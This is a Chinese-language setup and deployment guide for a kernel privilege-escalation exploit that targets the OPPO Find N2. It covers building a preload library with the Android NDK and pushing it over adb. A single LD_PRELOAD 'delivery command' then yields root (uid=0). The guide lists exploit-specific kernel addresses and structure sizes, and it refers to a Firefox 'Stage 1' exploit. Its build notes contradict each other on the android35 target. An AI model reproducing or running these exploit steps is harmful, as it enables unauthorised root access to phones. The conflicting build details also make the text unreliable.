# docs/setup.md

# 环境搭建与部署文档

> 状态（2026-10-05 冻结）：当前产物为 `preloadP.so`（构建自 `exploit-v29/build/oppo-find_n2/bin/preload.so`，sha256 `b5128c72…`，214,040 B）；零环境变量单条命令即可拿到真 root（uid=0）。

## 依赖清单

| 依赖名称 | 版本要求 | 安装方式 | 是否必填 | 备注 |
|----------|----------|----------|----------|------|
| Android NDK | r29 | 下载解压 | ✅ 是 | 必须使用 android35 |
| macOS / Linux | — | — | ✅ 是 | 开发主机 |
| adb | — | Android SDK Platform Tools | ✅ 是 | 设备调试 |
| IDA Pro | — | 商业软件 | ⚠️ 可选 | 内核偏移验证 |
| pahole | — | `brew install pahole` | ⚠️ 可选 | 结构体偏移验证 |
| Firefox | 151 | Mozilla 官网 | ⚠️ 可选 | Stage 1 exploit |
| OPPO Find N2 | kernel 5.10.236 | — | ✅ 是 | 目标设备 |

## 本地开发环境搭建

### macOS 环境

```bash
# 1. 安装 Android NDK r29
brew install --cask android-ndk

# 2. 验证 NDK 路径
ls /usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang

# 3. 设置环境变量
export NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK

# 4. 验证编译器
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang --version
```

### Linux 环境

```bash
# 1. 下载 Android NDK r29
wget https://dl.google.com/android/repository/android-ndk-r29-linux.zip
unzip android-ndk-r29-linux.zip -d /opt/

# 2. 设置环境变量
export NDK=/opt/android-ndk-r29

# 3. 验证编译器
$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang --version
```

### 设备连接

```bash
# 1. 启用 USB 调试
# 设置 → 关于手机 → 连续点击版本号 7 次 → 开发者选项 → USB 调试

# 2. 连接设备
adb devices
# 应显示: [redacted]    device

# 3. 验证设备信息
adb shell getprop ro.build.display.id
# 应显示: UP1A.231005.007
```

## 编译与部署

### 编译 exploit

当前树为 `exploit-v29/`,用 `build_v29.sh`(无 make 环境下的手写展开)构建:

```bash
# 进入 exploit-v29 目录并编译
cd exploit-v29/
bash ../build_v29.sh

# 验证输出
ls -la build/oppo-find_n2/bin/preload.so
# 应显示 214,040 B (sha256 b5128c725216aad1464bc5c54e39bb2d980c2b3a474adc17278a4f9100acdb54)
```

历史(`exploit/` 子树,make 构建):

```bash
# 进入 exploit 目录
cd exploit/

# 清理旧文件
make clean

# 编译 (macOS)
make NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK

# 编译 (Linux)
make NDK=/opt/android-ndk-r29
```

### 部署到设备

```bash
# 推送到设备 (当前产物名为 preloadP.so)
adb push exploit-v29/build/oppo-find_n2/bin/preload.so /data/local/tmp/preloadP.so

# 设置权限
adb shell chmod 755 /data/local/tmp/preloadP.so

# 验证文件并核对 sha
adb shell ls -la /data/local/tmp/preloadP.so
adb shell sha256sum /data/local/tmp/preloadP.so
# 期望: b5128c725216aad1464bc5c54e39bb2d980c2b3a474adc17278a4f9100acdb54  (214,040 B)
```

### 运行测试

```bash
# 基础冒烟测试(仅验证 so 能被加载)
adb shell 'LD_PRELOAD=/data/local/tmp/preloadP.so /system/bin/ls /dev/null' 2>&1
# 预期输出: "preload starting pid=..."

# 交付命令(零环境变量单条命令,直接拿真 root)
adb shell "LD_PRELOAD=/data/local/tmp/preloadP.so /system/bin/toybox id"
# 预期输出: uid=0(root) gid=0(root) groups=0(root),… context=u:r:shell:s0
```

## 配置项全解

### 编译配置

| 配置项名 | 环境变量 | 默认值 | 可选值 | 作用说明 | 是否必填 |
|----------|----------|--------|--------|----------|----------|
| NDK 路径 | `NDK` | — | NDK 安装路径 | Android NDK 根目录 | ✅ 是 |
| API Level | `API` | 35 | 21-35 | Android API 版本 | ⚠️ 可选 |
| 目标设备 | `PROJECT` | — | `oppo-find_n2` | 目标设备配置 | ✅ 是 |

### target.h 关键配置

| 常量名 | 值 | 说明 |
|--------|-----|------|
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` | 内核文本段基地址 |
| `P0_PAGE_OFFSET` | `0xffffff8000000000` | 直接映射区起始 |
| `P0_KERNEL_PHYS_LOAD` | `0xa8000000` | XBL 固件硬编码物理加载地址 |
| `MM_STRUCT_SZ` | `0x3c0` | mm_struct 大小 |
| `MM_ORDER` | `3` | slab order (32KB) |

## 升级与回滚

> [!NOTE] 待补充：对话中未提及相关信息

## 注意事项

> [!WARNING]
> - 编译必须使用 `make clean && make`，Makefile 不追踪 .h 文件变化
> - NDK 必须是 r29 版本，android35 会导致 shadow stack OOM
> - 设备无持久 root：提权为瞬时（worker `pause()` park），KernelSU 未 Live ⇒ 暂无 `su`；`/proc/kallsyms` 仍需 `CAP_SYSLOG`，`dmesg` 亦受限
